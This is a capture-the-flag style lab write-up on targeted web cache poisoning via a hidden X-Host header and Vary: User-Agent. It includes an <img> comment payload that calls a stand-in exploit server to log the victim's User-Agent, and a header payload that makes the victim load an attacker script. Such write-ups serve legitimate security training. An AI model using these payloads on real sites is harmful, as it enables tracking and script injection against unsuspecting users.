# Lab: Targeted web cache poisoning using an unknown header

## Description
This lab contains a web cache poisoning vulnerability where the poison affects only a specific user. We need to find an unknown header and use it to target the victim.

## Analysis
The application reflects a custom header in the response. We can use the "Param Miner" extension in Burp Suite to find this hidden header. In this lab, the header is `X-Host`.

Additionally, the application includes a `Vary: User-Agent` header. This means the cache is segmented by the `User-Agent`. To poison the cache for the victim, we need to know their `User-Agent`.

## Exploitation
I need to find the victim's `User-Agent` and then poison the cache specifically for them.

### Steps
1. Use Param Miner to find the hidden header: `X-Host`.
2. Find the victim's `User-Agent`. In this lab, we can do this by posting a comment with an `<img>` tag pointing to our exploit server and checking the access logs.
   Comment: `<img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log">`
3. Capture the victim's `User-Agent` from the logs.
4. Poison the cache using the `X-Host` header and the victim's `User-Agent`:
   - `X-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net`
   - `User-Agent: [Victim's User-Agent]`
5. Once the cache is poisoned, the victim will load a malicious script when they visit the homepage.

## Payload
```text
X-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
User-Agent: [Victim's User-Agent]
```

## Takeaways
- The `Vary` header is intended to prevent cache issues but can also be used to target specific groups of users or even individuals.
- Hidden or internal headers are often used for routing or debugging and can be powerful attack vectors.
- Param Miner is an essential tool for discovering hidden parameters and headers.
Base the research on the information provided in the lab description.
